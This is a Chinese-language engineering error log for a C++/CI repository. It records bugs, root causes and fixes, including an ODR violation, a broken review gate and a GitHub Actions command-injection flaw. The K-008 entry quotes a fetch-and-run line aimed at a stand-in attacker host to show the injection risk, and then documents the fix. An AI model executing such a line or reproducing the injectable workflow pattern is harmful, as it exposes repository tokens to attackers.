# errors.md — 踩過的錯誤

慣例見 [`INDEX.md`](INDEX.md)。每條記「**錯誤 + 根因 + 解法**」，新的在上，機密只記位置不記值。

---

## K-014 — 同一 namespace 下三個同名不同型別的 `struct`：單獨看每個程式都對，連在一起才是 UB，而所有旗標與 sanitizer 都靜默

- 日期：2026-11-12 | 來源：`CHG-20261112-05`（發現於 `H1-06` 派工，由 `I1.1` 事前查出兩處、`I1` 複查為三處）
- 狀態：**未修復**（成因在三個**已合併**單元的標頭，修它要動 E4-03 / E4-18 / E4-14 的公開契約，屬另案）

### 錯誤

`ds::elements::RenderModel` 在 `modules/elements/` 底下有**三個**定義，全在同一個 namespace，結構完全不同：

| 定義處 | 單元 | 內容大致 |
|---|---|---|
| `bar_gauge.hpp:68` | E4-03 | `kind` / `fill_ratio` / `has_angle` / 量表角度…（`sizeof` = **224**） |
| `radial_pointer.hpp:50` | E4-18 | `value_ratio` / `angle_degrees` / 指針幾何比例…（`sizeof` = **144**） |
| `scroll_view.hpp:54` | E4-14 | `lines` / `position` / `viewport_lines` / 分頁指示… |

同一個 TU 含兩份 → 重定義，編譯當場失敗，**這一半是安全的**。
危險的是另一半：兩個 TU 各含**一份不同的**定義、連進**同一個程式** → **違反單一定義原則（ODR）**，UB。

### 這一族的特徵：失效方向是「看起來完全正常」

實測（g++ 13.3.0，兩個 TU 各 `sizeof` 該型別後連成一個程式）：

```
g++ -Wall -Wextra -Wpedantic  編譯兩個 TU   → 各 rc=0、零診斷
連結                                        → rc=0、零診斷
執行                                        → 印出 a=224 b=144
```

**同一個執行檔裡，同一個型別名稱有兩種大小，而工具鏈一聲不響。** 與 `K-013` 同一族（綠燈下的潛伏 UB），
而且比它更難抓：`K-013` 至少 ASan 會以 `stack-use-after-scope` 報出來，本條**連 ASan + UBSan 都零報告**
（`CHG-20261112-04` 新增的 `gate_sanitizers` 閘門對它無效）。

### 唯一抓得到它的機械化方法，以及那個方法的邊界

`-flto -Wodr` 可以抓到，**但有條件**，這個條件必須記清楚，否則會誤以為已經有防線：

```
形狀 A：該型別只在各自 TU 內被 sizeof 用到，不跨 TU 出現在簽章裡
  g++ -flto -Wodr（編譯 + 連結）     → 零診斷。抓不到。
形狀 B：該型別跨 TU 出現在同一個函式的簽章裡（真實程式碼的形狀）
  g++ -flto -Wodr（編譯 + 連結）     → warning: type 'struct RenderModel'
                                        violates the C++ One Definition Rule [-Wodr]
```

GCC 的 LTO 型別合併只在型別**真的跨 TU 被比較到**時才去比對定義。所以 `-Wodr` 是一道有用但**不完整**的防線：
它抓得到會真的出事的那個形狀，抓不到「現在還沒出事、但定義已經分叉」的狀態。

### 目前是陷阱而非已踩的地雷——但下一步就會踩

截至本條記錄時，main 上**沒有**任何 target 同時連進兩側（查全部 `target_link_libraries`）：

```
desktop_shell_host → h1_01_paint + c2_02          兩者都是 bar 側（E4-03）
test_h1_06         → h1_06_paint_model → c2_02    bar 側
test_h1_06_radial  → h1_06_radial     → e4_18     radial 側
```

`H1-06` 之所以安全，是因為實作者**事前查到**這件事並刻意把兩側拆成**兩個獨立程式**。
但該單元交回的待辦明寫「把新 kind 註冊進 `host/app/host_main.cpp`」——那一步會讓
`desktop_shell_host` 同時連進 `c2_02`（bar 側）與 radial 側，**出貨的執行檔當場成為實際的 ODR 違反**。

### 解法

- **短期（做下一步之前必須先決定）**：接 radial kind 進 host 之前，先解決同名問題。
  三個型別其實是三件不同的東西，正確的修法是讓它們各自有自己的名字
  （例如 `BarRenderModel` / `RadialRenderModel` / `ScrollRenderModel`，或各自收進
  `ds::elements::bar_gauge` / `::radial_pointer` / `::scroll_view` 子 namespace）。
  **這會動到三個已合併單元的公開契約，必須另開單元，不得由任何單元順手改。**
- **中期**：在 CI 加一道 `-flto -Wodr` 的建置（連結階段才會報，故必須真的連到執行檔／測試二進位）。
  邊界如上：它抓形狀 B、抓不到形狀 A，所以它是輔助而非充分條件。
- **寫新程式碼時**：在既有 namespace 裡新增一個**通用名稱**的型別（`RenderModel` / `Config` / `Options` /
  `Result` 這類）之前，先 grep 同 namespace 下是否已有同名者。本條的三個定義分別來自三個單元，
  每一個單獨看都合理——問題只在**合起來**，而沒有人看合起來的樣子。

### 與既有條目的關係

[[K-013]] 的第二代：同樣是「UB 存在而測試全綠」，但本條連 sanitizer 都看不見。
與 [[K-003]] / [[K-007]] 的共同點是「兩道防線同時空轉」——這裡是警告旗標與 sanitizer 同時空轉。

---

## K-013 — 以 const 參考持有的建構子 + 按值回傳的工廠函式 = 懸空參考，而**測試是綠的**

- 日期：2026-11-12 | 來源：`CHG-20261112-e9_11`
- 狀態：**已修復**（測試改以一個把 env 與 loader 綁在同一物件的小工具持有，env 宣告在前）

### 錯誤

E9-11 的測試這樣把 host 環境餵給 E8-04 的載入器，**35/35 全綠**：

```cpp
ModuleLoader loader(compose_host_environment(ledger, pkg));   // ← 臨時物件
const LoadResult r = loader.load(spy.make(pkg));
```

真相是在做**突變測試**時才露出來的：把「未決」改成樂觀預設（刻意改壞）後，預期看到幾個斷言
變紅，實際拿到的是 `exit=-11`（**SIGSEGV**）。程式不是斷言失敗，是**崩潰**。

也就是說：那組測試原本的綠燈，有一部分是 UB 恰好沒踩爆而來的。

### 根因

E8-04 `ModuleLoader` 以 **const 參考**持有 host（`module_loader.hpp`：
`explicit ModuleLoader(const HostEnvironment& host) : host_(host) {}`），而 E9-11 的
`compose_host_environment()` 是**按值回傳**的工廠函式。兩者湊在一起時，臨時 `HostEnvironment`
在該敘述結束就被銷毀，`loader.host_` 自此指向死掉的物件 —— 讀它是 UB。

UB 的危險不在「一定會爆」，而在「**不一定會爆**」：原本的程式碼路徑剛好沒去碰那塊已釋放的
記憶體（權限集合小、分配器還沒覆寫），所以測試全綠；改了邏輯之後走到會碰的路徑，才變成
segfault。**綠燈完全不代表那段生命週期是對的。**

這一族與 K-002 / K-011 同源：失敗被包裝成一個看起來正常的結果（綠燈 / 退出碼 0），
而真正的訊號在別的地方。

### 解法

1. 讓環境**活得比**持有它的參考久。測試裡以一個小工具綁定（成員宣告順序即初始化順序，
   env 在前）：

```cpp
struct GatedLoader {
    ds::ext::HostEnvironment env;   // 宣告在前 → 先初始化
    ModuleLoader loader;
    explicit GatedLoader(ds::ext::HostEnvironment e) : env(std::move(e)), loader(env) {}
};
```

2. 通則：看到「某型別以 `const T&` 成員持有建構參數」就不要把**臨時物件**餵給它。
   呼叫端得先有一個具名變數，或由一個同時擁有兩者的物件綁定生命週期。
3. **突變測試不只檢查斷言有效性，也會抖出潛伏的 UB。** 一個只在正向路徑上跑過的測試，
   連自己踩在懸空參考上都不知道。把實作刻意改壞、觀察**失敗的形狀**（斷言紅 vs 崩潰）
   是這條被抓到的唯一原因 —— 若當時只看「綠燈 → 收工」，它會一路留到相位 2。

---

## K-012 — 貪婪的 `sed 's/.*: *//'` 取到表頭最後一欄：G5 的「不得自我驗收」從上線起空轉

- 日期：2026-11-11 | 來源：`CHG-20261111-02`
- 狀態：**已修復**（取值先以 `grep -o '<欄位>: *[^ |]*'` 切出該欄位本身）

### 錯誤

G5 的第二項職責是「驗收者與實作者同一人即紅」。實測偽造一份兩邊都寫同一人的驗收：

```
CHG:  - Date: 2026-11-11 | Branch: feat/x | Risk: medium | Implemented by: I1.1
ACC:  - Date: 2026-11-11 | Unit: X | Verifier: I1.1 | Branch: feat/x
→ IMP=[I1.1]  VER=[feat/x]
→ G5 放過了，exit=0
```

**同一人自我驗收，閘門沒擋。** 不是訊息問題，是判定根本沒發生。

### 根因

```bash
VER=$(grep -m1 'Verifier:' "$A" | sed 's/.*: *//')
```

`sed` 的 `.*` 是**貪婪**的，會匹配到行內**最後**一個 `: `。房屋格式的 ACC 表頭以 `|` 分欄，
而 `Verifier:` 不是最後一欄：

```
- Date: 2026-07-29 | Unit: E1-01 | Verifier: V1.5 | Branch: feat/e1_01
                                                     ^^^^^^^ 貪婪 .* 吃到這裡
→ VER = "feat/e1_01"（而不是 "V1.5"）
```

CHG 表頭的 `Implemented by:` **恰好排在行尾**，所以 `IMP` 取對了（`I1.96`）。
一邊取到人、一邊取到分支名，於是 `[ "$IMP" = "$VER" ]` **結構上永遠不相等**——
這道防線從上線起就沒有任何一次真的比對過身分。

兩個讓它活得久的條件：

1. **失效方向是「放過」**，而放過不產生任何輸出。閘門印不出「驗收者與實作者同一人」，
   看起來就像「檢查過了、沒問題」。
2. **190 多個單元都是真的獨立驗收**，所以從來沒有一個案例應該被擋。
   正確的輸入掩護了壞掉的判定——這和 [[K-003]]（契約測試只測自帶 stub）同一種掩護關係。

### 解法

取值前先用 `grep -o` 把**該欄位本身**切出來，再交給 `sed`：

```bash
IMP=$(grep -m1 -o 'Implemented by: *[^ |]*' docs/changes/CHG-*-$S.md | head -1 | sed 's/.*: *//' || true)
VER=$(grep -m1 -o 'Verifier: *[^ |]*' "$A" | head -1 | sed 's/.*: *//' || true)
```

`[^ |]*` 在空白與 `|` 處停住，正好對上表頭的管線分欄。實測：真實 ACC 取出 `V1.5`
（原為 `feat/e1_01`）、真實 CHG 仍為 `I1.96`，偽造的自我驗收被擋下。
**合法 PR 的判定不受影響**（`V1.5` ≠ `I1.96`，本來就該過）。

要點：

- **不要用「正確的輸入」驗證一道閘門。** 要驗它擋不擋，就得餵它**應該被擋**的輸入。
  本次是先偽造一份自我驗收的 ACC 才看見它空轉的。
- 回歸測試一律以**房屋格式表頭**構造 fixture（`tests/gates/test_g5_acc_identity.py`）。
  用單冒號的簡化格式寫測試，正好會漏掉這個缺陷——因為簡化格式下貪婪 `sed` 恰好取對。
- `grep` 吃多個檔時會加 `檔名:` 前綴，`-o` 之後仍由 `sed` 取末段，故多檔 glob 也成立（已實測）。

## K-011 — `pipefail` 讓賦值靜默中止：閘門擋對了，卻印不出為什麼

- 日期：2026-11-11 | 來源：`CHG-20261111-02`
- 狀態：**已修復**（含管線的賦值一律收尾 `|| true`，並補空值檢查維持 fail-closed）

### 錯誤

PR #225（E9-10，medium）在 ACC 尚未產出時被 G5 擋下——**這是正確的**。但 CI 日誌裡
只有一行：

```
##[group]Run S=$(echo "${GITHUB_HEAD_REF#feat/}")
  ...（腳本原文）
##[error]Process completed with exit code 2
```

**沒有任何 `::error::` 註解。** 那句寫好的「medium 風險需要 ACC，未找到」從來沒印出來。
操作者看到的是一個裸的 exit 2，必須自己去讀 workflow 原始碼才知道閘門在抱怨什麼。

### 根因

```bash
A=$(ls docs/acceptance/ACC-*-$S.md 2>/dev/null | head -1)
[ -z "$A" ] && { echo "::error::medium 風險需要 ACC，未找到"; exit 1; }
```

該步驟的 shell 是 GitHub `shell: bash` 的預設展開式
`bash --noprofile --norc -e -o pipefail`。ACC 不存在時 `ls` 回 **2**，`pipefail` 讓整條
管線的結果變成 2，於是**第一行的賦值失敗**，`-e` 當場中止腳本——**第二行永遠跑不到**。

逐字重現：

```
$ bash --noprofile --norc -e -o pipefail -c 'A=$(ls no/such/*.md 2>/dev/null | head -1); [ -z "$A" ] && { echo "::error::訊息"; exit 1; }'
exit=2，訊息完全沒印

$ # 加上 || true
exit=1，::error::訊息
```

同一步驟內還有兩處同構：`IMP=$(grep -m1 … | sed …)`、`VER=$(grep -m1 … | sed …)`——
`grep` 無命中回 1，同樣讓賦值靜默中止。

這是本 repo 記過三次的同一族：**閘門「當掉」與閘門「擋下」在 exit code 上無法區分**
（見 [[K-009]]，以及 `scope_check.py` / `status_check.py` 檔頭註解）。
前三次都發生在 Python 閘門裡，這次是同一陷阱在 workflow 的 `run:` 裡以 `pipefail` 形式再現。

### 解法

含管線的賦值一律收尾 `|| true`：

```bash
A=$(ls docs/acceptance/ACC-*-$S.md 2>/dev/null | head -1 || true)
```

**但 `|| true` 不可單獨用在 IMP / VER 上。** 取值失敗會得到空字串，而空字串讓身分比對
`[ "$IMP" = "$VER" ]` 自動「不相等」——那會把「擋下」悄悄換成「放過一份沒有 `Verifier:`
的 ACC」，即 fail-closed 退化成**真的假綠燈**。故每個取值後各補一道空值檢查：

```bash
VER=$(... || true)
[ -z "$VER" ] && { echo "::error::ACC 缺 'Verifier:' 行…"; exit 1; }
```

要點：

- **修可診斷性時要先確認原本的失效方向。** 這裡原本是 fail-closed（擋下但沒說原因），
  只加 `|| true` 會把它變成 fail-open。「讓訊息印出來」和「維持擋下」是兩件事，要分別做到。
- `[ -z "$A" ] && { …; }` 這種寫法**不受 `-e` 影響**（`&&` 列表中非最後一個命令豁免），
  所以 A 非空時不會中止——這也是為什麼 190 多個單元一直正常通過 G5。別順手「一起修」它。
- 回歸測試不能只驗退出碼。本缺陷的特徵是**退出碼對、訊息沒了**，所以斷言必須是
  「非零退出 **且** 訊息真的印出來」兩件事一起驗（`tests/gates/test_g5_acc_identity.py`）。

### 未關閉的缺口

`governance.yml` 其餘步驟尚未逐一審過同一陷阱。本次只修 G5（踩到的那一步），
並在 G5 加了一條靜態測試擋住「日後新增一行含管線的賦值卻忘了 `|| true`」。
**其他步驟的同類風險仍然開著。**

---

## K-010 — CI 產物「上傳成功」不等於「拿得到」：artifact 只能由人在瀏覽器點下載

- 日期：2026-08-29 | 來源：`CHG-20260829-03`
- 狀態：**已修復**（截圖 workflow 改為同時推進 `bot/windows-screenshots` 分支）

### 錯誤

`screenshot-windows.yml` 以 `actions/upload-artifact` 交付截圖。workflow 全綠、
log 明寫 `Artifact windows-screenshots has been successfully uploaded!`、
`Uploaded bytes 502560`、還給了一個 `Artifact download URL`。

然後**取不到檔案**：

```
https://api.github.com/repos/<owner>/<repo>/actions/artifacts/<id>/zip   → 連不上
https://github.com/<owner>/<repo>/actions/runs/<run>/artifacts/<id>      → HTTP 403
```

### 根因

artifact 的下載端點要求一個**互動式工作階段或另一組憑證**。
agent 的執行環境走的是 proxy 注入的 git 憑證——它讓 `git fetch` / `git push` 能動，
但那是 git 協定的憑證，**取不出來也套不到 HTTPS 下載端點上**。

更深一層的問題是設計假設：`upload-artifact` 預設的消費者是**坐在瀏覽器前面的人**。
在一個由 agent 操作的 repo 裡，「產物要人去點一下才拿得到」等於**這條路只走得完一半**——
而且它會偽裝成成功：workflow 綠燈、log 說上傳成功，失敗發生在下游、無聲無息。

### 解法

產物**同時**推進一個覆寫式分支，讓 git 拿得到：

```yaml
permissions:
  contents: write      # 推分支需要
...
      - name: 推進 assets 分支
        shell: bash
        env:                                   # env: 一律寫在 run: 之前（G8 以縮排判區塊）
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          rm -rf .assets && mkdir -p .assets/docs/images
          cp shots/*.png .assets/docs/images/
          cd .assets
          git init -q -b bot/windows-screenshots
          git config user.name  "github-actions[bot]"   # 要設在**這個新 repo** 裡
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A && git commit -q -m "chore(assets): ..."
          git push -q --force "https://x-access-token:$GITHUB_TOKEN@github.com/${{ github.repository }}.git" bot/windows-screenshots
```

`upload-artifact` 保留給人用，兩者並存。

### 預防

- 交付產物時先問：**誰是消費者？** 消費者是 agent 就不能用「要人點一下」的通道。
- 連帶踩到的小坑：`git config user.name` 下在外層 checkout 上**沒有用**——
  commit 發生在新 `git init` 的 repo 裡，而 runner 沒有全域 git 身分，會直接失敗。

---

## K-009 — 釘住寫入端編碼只解決一半；讀取端沒釘，例外會跑到別的執行緒去

- 日期：2026-08-10 | 來源：`CHG-20260810-05`
- 狀態：**已修復**（五支閘門腳本補釘輸出端；`test_backend_guard.py` 補釘讀取端）
- 家族：[[K-001]] / [[K-004]] 的第三代

### 錯誤

把 `tests/e1/test_backend_guard.py` 接進 CI 之前先在本機跑，14 個測試紅 1 個：

```
UnicodeEncodeError: 'charmap' codec can't encode characters in position 19-20
  File "scripts/backend_guard.py", line 173, in check
    print(f"backend_guard OK — 相位 {phase}，後端 ...")
```

依 [[K-001]] 的解法補上 `sys.stdout.reconfigure(encoding="utf-8")`，子行程不再當掉。
**但同一個測試還是紅的**，換成另一個症狀：

```
TypeError: unsupported operand type(s) for +: 'NoneType' and 'str'
    self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
```

`returncode == 0`（子行程明明成功了），`stdout` 卻是 `None`。

### 根因

`subprocess.run(..., capture_output=True, text=True)` **沒指定 `encoding`**，
父行程就用 locale 編碼（Windows cp1252）去解碼子行程的 UTF-8 輸出：

```
Exception in thread Thread-1 (_readerthread):
UnicodeDecodeError: 'charmap' codec can't decode byte 0x8d in position 26
```

關鍵在**那個例外是在 subprocess 的 reader thread 裡拋的**。它不會傳播到
`subprocess.run()` 的呼叫端——`run()` 正常回傳，`returncode` 是 0，只有 `stdout`
悄悄變成 `None`。呼叫端看到的現象是「這個指令沒有輸出」，不是「解碼失敗」。

所以這一族的陷阱有**兩端**，而修好寫入端會讓讀取端的問題**換一張臉出現**：

| | 症狀 | 誤讀成 |
|---|---|---|
| 寫入端沒釘 | `UnicodeEncodeError`，行程當掉 | 「腳本有 bug」 |
| 讀取端沒釘 | 靜默 `stdout=None`、`returncode=0` | 「指令沒有輸出」 |

### 解法

**兩端都要明示 UTF-8。**

寫入端（每支會輸出 CJK 的腳本，開頭）：

```python
for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        _stream.reconfigure(encoding="utf-8", errors="replace")
```

讀取端（每個讀這些腳本輸出的 `subprocess` 呼叫）：

```python
subprocess.run(..., capture_output=True, text=True,
               encoding="utf-8", errors="replace")
```

本次補齊的寫入端：`backend_guard.py`、`halt_gate.py`、`plan.py`、
`scope_check.py`、`stage_check.py`（`status_check.py` / `workflow_lint.py` 原本就有）。

### 教訓

1. **`text=True` 不等於「用 UTF-8」**，它只是「回字串而不是 bytes」，
   編碼仍取自 locale。要 UTF-8 就得寫出來。
2. **在別的執行緒拋出的例外不會讓你的程式碼變紅**，只會讓某個值變成 `None`。
   看到「成功但沒有輸出」，先懷疑解碼。
3. 這條在 Linux CI 上永遠不會出現（預設 UTF-8）。**只在開發機咬人**——
   於是很容易被當成「我這台的問題」而不是缺陷。

---

## K-008 — PR 內文被 CI 當成指令執行：`${{ }}` 內插進 `run:` 就是命令注入

- 日期：2026-08-10 | 來源：`CHG-20260810-04`（發現於 `CHG-20260810-03` 的 PR #210 CI log）
- 狀態：**已修復**（G2 改走 `env:`；新增 G8 `workflow_lint` 防復發）

### 錯誤

PR #210 的閘門全綠、順利合併。但翻 `gate` job 的 log 時，**G2 步驟**裡有一整排：

```
line 39: Proposed: command not found
line 39: scripts/status_check.py: Permission denied
line 39: session_start.py: command not found
line 39: tests/e1/test_backend_guard.py: Permission denied
line 39: 已驗收/已收尾/accepted/closed: No such file or directory
```

那些全部是**該 PR 內文裡的 markdown 行內程式碼**。G2 只是想檢查內文有沒有 `CHG-`
字樣，結果把內文當成 shell 腳本執行了一遍。

這次的後果是良性的（沒有可執行權限、指令不存在）。但同一條路徑上，
`$(curl attacker.example/x.sh | sh)` 會在帶著 `contents: write` +
`pull-requests: write` 的 GITHUB_TOKEN 的 runner 上執行。
**任何能在本 repo 開 PR 的人都做得到，不需要任何額外權限。**

### 根因

```yaml
run: |
  echo "${{ github.event.pull_request.body }}" | grep -qE 'CHG-[0-9]{8}-'
```

關鍵在於 **`${{ }}` 不是 shell 變數**。它是 GitHub Actions 在**把腳本交給 shell
之前**做的字串替換——runner 先把 PR 內文原封不動貼進腳本檔，才啟動 bash。
於是內文裡的反引號與 `$(...)` 對 bash 而言就是命令替換語法，不是資料。

雙引號救不了：`"..."` 內部的反引號與 `$()` 照樣求值。**引號只擋斷字，不擋求值。**

這個寫法從 G2 上線起就存在，一直沒被發現，是因為**在此之前沒有人在 PR 內文裡
寫過反引號**。缺陷不是被測出來的，是被一份剛好含 markdown 行內程式碼的內文撞出來的。

### 解法

**透過 `env:` 傳值**——shell 自己去讀環境變數，值永遠是資料：

```yaml
env:
  PR_BODY: ${{ github.event.pull_request.body }}
run: |
  printf '%s' "$PR_BODY" | grep -qE 'CHG-[0-9]{8}-'
```

（`printf '%s'` 而非 `echo`：`echo` 對含 `-n`／`-e` 開頭的內容行為依實作而異。）

同時修掉同類的三處 `origin/${{ github.base_ref }}`——**git 允許分支名含 `$`、
`(`、`)` 與反引號**，ref 名內插進 `run:` 是同一個注入面，只是利用門檻較高。

**防復發：G8 `scripts/workflow_lint.py`**（`CHG-20260810-04`）。判定採**允許清單**
而非黑名單：`run:` 裡出現的 `${{ }}` 一律違規，除非在清單上（整數、SHA、repo 全名、
`steps.*.outputs.*`）。黑名單擋不完——今天擋 `body`，明天有人用 `title`、`head_ref`、
issue comment。需要例外時加 `# workflow-lint: allow <理由>`，**理由不可空白，
且必須貼在違規行本身或其上一行**（貼在步驟開頭會替日後新增的行一起背書）。

### 教訓

1. **`${{ }}` 在 `run:` 裡永遠當成「貼字串進腳本」來讀，不要當成變數。**
   要判斷安不安全，問的不是「這個值是誰的」，而是「把這段文字貼進 bash 會怎樣」。
2. **閘門的 log 要看，不是只看紅綠。** 這個缺陷所在的那次執行是**綠燈**——
   注入的指令全部失敗，但 `grep` 成功了，步驟就過了。只看 exit code 永遠看不到它。
3. 這條與 [[K-003]] 同型：**守衛自己有洞，而洞不會讓任何測試變紅。**
   差別在 K-003 是防線空轉，這條是防線本身變成攻擊面。

---

## K-007 — 契約一接上真實後端，立刻抓到 16 個單元踩在不可能成立的路徑上

- 日期：2026-08-03 | 來源：`CHG-20260803-10`（修 [[K-003]] 的當下發現）
- 狀態：**已對齊**（`CHG-20260803-11`，取 win32 嚴格版；前置條件已回到共用契約）

### 錯誤

[[K-003]] 修好、契約第一次真的跑在真實後端上，**第一次執行就紅**：

```
[  FAILED  ] NullBackend/KernelBackendContract.CreateSurfaceRequiresInitialized/null
```

win32 後端通過、null 後端失敗。

### 根因

兩個後端對「未 `init()` 就 `create_surface()`」的處理**從一開始就不一致**：

- **win32**：回 `false`。真實後端必須先註冊視窗類別，這是物理限制，不是實作偏好。
- **null**：建立成功。它只是往記憶體 vector 塞一筆，沒有任何前置條件。

舊契約**明明有這一條**（修復前的「契約 4」），但它測的是契約組自帶的 stub，
所以這個分歧從相位 1 存在至今，沒有任何機制會發現。

**真正的損害不是那一條測試紅**：追下去發現 **16 個既有單元的測試**
（c1_01/02/03/07、c2_01/08/10、c3_02/03、c4_02/03、e1_02/08/09、e4_30、e10_05）
都在**未初始化的 null 後端上建 surface**——實測需要 151 個插入點才能補齊。
那些程式路徑在**任何真實後端上都不可能成立**。相位 1 全程沒有人察覺，
因為 null 後端太寬容，而契約沒在看。

### 處置歷程：先釘住，再對齊

**第一步（`CHG-20260803-10`）— 釘住。** 對齊要改動承重單元 E1-24 的行為並牽動 16 個單元
的測試，屬獨立的方向決策，不該夾帶在「修契約鴻溝」那張 CHG 裡。故兩邊各留一條測試
釘住現況，讓分歧可見且被追蹤。

**第二步（`CHG-20260803-11`）— 對齊到 win32 嚴格版。** 使用者裁定方向後執行：
`NullKernelBackend::create_surface` 加上 `initialized_` 前置條件，
26 個測試檔補上 `init()`，兩條釘住用的測試移除，前置條件回到共用契約
（現為 17 條，null 與 win32 各跑一遍）。

### 對齊時踩到的三種「看起來像宣告，其實不是」

批次插入 `init()` 連續失敗三次，每次成因不同——記下來，因為任何對 C++ 做文字批次處理
的工具都會遇到同一組陷阱：

| 樣式 | 為什麼不能插入 | 正確做法 |
|---|---|---|
| `struct Rig { NullKernelBackend b{...}; ... };` | 成員宣告區不能放陳述句 | 加成員初始器 `bool b_initialized_ = b.init();`——C++ 保證成員依**宣告順序**初始化，故它在其後成員建構前完成。**不能用建構子本體**：那在所有成員建構之後才跑，太晚 |
| `NullKernelBackend make_backend(...) {` | 這是**回傳型別為該型別的函式定義**，不是變數宣告 | 排除以 `(` 接續且不以 `);` 結尾者 |
| `NullKernelBackend b(caps());` | 是宣告，但被上一條的排除規則誤殺 | 以「該行是否以 `);` 結尾」區分宣告與函式定義 |

### 可帶走的通則

- **過度寬容的測試替身會把 bug 養大。** null 後端「什麼都接受」讓 16 個單元長出了
  在真實環境不可能成立的用法。替身應該**盡量嚴格**，寬容留給真實實作。
- **一個沒被執行過的契約條款，等於不存在。** 舊契約寫了「未初始化不得建立」，
  白紙黑字擺了整個相位 1，卻擋不下任何東西。
- **修好一道檢查之後，第一次執行的紅燈是資產不是麻煩。** 它一次付清了長期累積的欠款。
- 發現的問題大到需要獨立決策時，**釘住現況並記錄，比匆促對齊或默默跳過都好**。
- **對 C++ 做文字批次處理，務必先分類再動手**，且每輪都要建置驗證。
  「看起來像宣告」的樣式至少有三種不同語意（見上表）。

### 可帶走的通則

- **過度寬容的測試替身會把 bug 養大。** null 後端「什麼都接受」讓 16 個單元長出了
  在真實環境不可能成立的用法。替身應該**盡量嚴格**，寬容留給真實實作。
- **一個沒被執行過的契約條款，等於不存在。** 舊契約寫了「未初始化不得建立」，
  白紙黑字擺了整個相位 1，卻擋不下任何東西。
- **修好一道檢查之後，第一次執行的紅燈是資產不是麻煩。** 它一次付清了長期累積的欠款。
- 發現的問題大到需要獨立決策時，**釘住現況並記錄，比匆促對齊或默默跳過都好**。
  匆促對齊會把方向決策藏進技術變更裡；默默跳過則讓下一個人重新踩一次。

## K-006 — CI 釘死 VS 產生器版本；以及一個差點讓我修錯方向的假線索

- 日期：2026-08-03 | 來源：`CHG-20260803-08`（G3w windows runner 首次執行）

### 錯誤

新增的 Windows 建置閘門第一次執行就紅，54 秒即失敗：

```
CMake Error at CMakeLists.txt:6 (project):
  Generator
    Visual Studio 17 2022
  could not find any instance of Visual Studio.
```

### 根因

workflow 裡把產生器版本釘死為 `-G "Visual Studio 17 2022"`
（照抄開發機上可用的那條指令），而 **GitHub runner 映像的 VS 版本會隨時間更新**。
開發機裝的是 VS 2022 Build Tools，`windows-latest` 上不是——
於是在本機百分之百可用的指令，到 CI 上必定失敗。

**把工具鏈版本釘死在 CI，等於把閘門綁在某一版 runner 映像上**，
映像一更新就壞，而且壞的時間點與任何程式碼變更都無關。

### 解法

省略 `-G`，讓 CMake 挑該機器上實際存在的 VS；`-A x64` 仍要指定
（不給的話 VS 產生器的預設平台不保證是 x64）：

```bash
cmake -S . -B build -A x64
grep -E '^CMAKE_GENERATOR(_PLATFORM)?:' build/CMakeCache.txt   # 印出實際選到的，供日後診斷
cmake --build build --config Debug --parallel 4
```

### 假線索：本機重現失敗，但失敗原因與待驗證的假設無關

為了在本機驗證修法，先把「不指定 `-G`」的 configure 跑在 scratchpad 目錄，
結果 `No CMAKE_CXX_COMPILER could be found`——**看起來剛好證實了「不指定產生器就找不到編譯器」**。

該結論是錯的。換到 repo 內跑同一個指令即正常。真正的原因是那個 scratchpad 路徑
（含 `HARUTS~1` 8.3 短檔名、且很長）干擾了 VS 執行個體探測，與 `-G` 與否毫無關係。

**若照第一次的結果下判斷，會往完全錯誤的方向修**——例如去改 CMakeLists、
加 `CMAKE_GENERATOR_INSTANCE`、或乾脆放棄不釘版本的做法。

### 可帶走的通則

- **CI 不要釘死工具鏈版本**（VS 產生器、編譯器路徑、SDK 版本）。
  讓工具自己找；真的需要固定時，用 runner 映像本身的版本標籤來固定，不要寫死在指令裡。
- **同時印出「實際選到什麼」**。日後環境變動時，那一行是第一個線索，成本近乎為零。
- **驗證失敗時，先確認「這次失敗」與「你要驗的假設」是同一件事。**
  在非典型環境（暫存路徑、短檔名、超長路徑、權限受限目錄）重現問題，
  很容易得到一個**恰好符合預期但成因完全不同**的失敗——那比沒有重現更危險，
  因為它會讓錯誤的假設看起來已被證實。換一個乾淨環境再跑一次，成本很低。
- 對照 [[K-002]]：兩者都是「看起來成立的證據其實在說別的事」。

## K-005 — squash merge 之後，從舊分支再開新分支必然衝突，而且閘門會安靜地不跑

- 日期：2026-08-03 | 來源：`CHG-20260803-07`（發生於 `CHG-20260803-06` 的 PR #196）

### 錯誤

開了 PR，結果 `gh pr checks` 回 **`no checks reported`**，PR 停在 OPEN 不動。
看起來像 CI 壞了或 workflow 沒設好——實際上 workflow 完全正常，
是 PR 本身處於 `mergeStateStatus: DIRTY`（有合併衝突），GitHub 因此不跑檢查。

### 根因

本 repo 的 governance workflow 一律以 **squash merge** 合併（`gh pr merge --squash`）。
squash 會把分支上的多個 commit 壓成 **main 上一個全新的 commit**，
**原本那些 commit 永遠不會成為 main 的祖先**。

於是：分支 A 被 squash 進 main 之後，如果又從**分支 A**（而不是從 `origin/main`）開分支 B，
分支 B 就同時帶著「A 的原始 commit」與「B 自己的 commit」，
而 main 帶著「A 的 squash 版本」。同一份內容出現在兩條互不相干的祖先線上 → 衝突。

**為什麼特別容易中招**：本機看起來一切正常——分支建得出來、commit 得了、
建置與測試全綠。問題只在**推上去之後**才顯現，而且第一個症狀（沒有檢查）
指向的方向完全錯誤（會讓人去查 workflow 設定、觸發條件、權限）。

### 解法

**squash merge 的 repo 裡，每一條新分支都必須從 `origin/main` 開：**

```bash
git fetch origin
git checkout -b <新分支> origin/main
git cherry-pick <要帶過來的 commit>
```

已經開錯的話，把分支重設到 main 再 cherry-pick，然後 force-push 更新 PR：

```bash
git fetch origin
git reset --hard origin/main
git cherry-pick <commit>
git push --force-with-lease origin <分支>
```

**換基底之後要重跑驗證。** 內容一樣不代表結果一樣——新基底上的其他變更可能與之互動。
本次即在新基底上重跑了全建與全套測試才推。

### 可帶走的通則

- **「沒有檢查」不等於「CI 壞了」。** 先查 `gh pr view --json mergeStateStatus`：
  `DIRTY` = 衝突、`BLOCKED` = 等檢查、`CLEAN` = 可合併。症狀與根因常常離很遠。
- **squash merge 會讓「分支已合併」與「commit 在 main 的歷史裡」變成兩件事。**
  用 `git log origin/main..HEAD` 判斷「還沒進 main 的東西」時，
  已被 squash 的 commit 仍會出現在列表裡——那是正常的，不是漏推。
- 連續交付多個相依的變更時，**每一輪都回到 `origin/main` 重新開分支**，
